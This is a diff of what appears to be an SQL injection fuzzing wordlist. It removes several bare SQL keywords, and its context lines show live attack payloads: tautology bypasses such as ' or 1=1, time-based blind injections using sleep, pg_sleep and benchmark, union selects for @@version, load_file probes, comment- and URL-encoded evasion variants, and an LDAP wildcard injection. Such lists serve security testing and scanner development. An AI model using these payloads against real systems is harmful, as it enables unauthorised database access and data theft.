@@ -8,7 +8,6 @@ update
 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 hi"""") or (""""a""""=""""a"""
 delete
-like
 " or sleep(__TIME__)#
 pg_sleep(__TIME__)--
 *(|(objectclass=*))
@@ -21,7 +20,6 @@ insert
 *|
 @var select @var as var into temp end --
 1)) or benchmark(10000000,MD5(1))#
-asc
 (||6)
 a"""" or 3=3--"""
 " or benchmark(10000000,MD5(1))#
@@ -36,7 +34,6 @@ or a = a
 )) or benchmark(10000000,MD5(1))#
 hi' or 'a'='a
 21%
-limit
  or 1=1
  or 2 > 1
 ")) or benchmark(10000000,MD5(1))#
@@ -86,7 +83,6 @@ x' AND members.email IS NULL; --
  and 1=( if((load_file(char(110,46,101,120,11 ...
 0x770061006900740066006F0072002000640065006C00 ...
 %20'sleep%2050'
-as
 1)) or pg_sleep(__TIME__)--
 /**/or/**/1/**/=/**/1
  union all select @@version--
@@ -159,7 +155,6 @@ exec sp
 0 or 1=1
 ) or (a=a
 uni/**/on sel/**/ect
-replace
 %27%20or%201=1
 )) or pg_sleep(__TIME__)--
 %7C
@@ -175,7 +170,6 @@ declare @q nvarchar (4000) select @q =
 or 0=0 --
 desc
 ||'6
-)
 1)) or sleep(__TIME__)#
 or 0=0 #
  select name from syscolumns where id = (sele ...
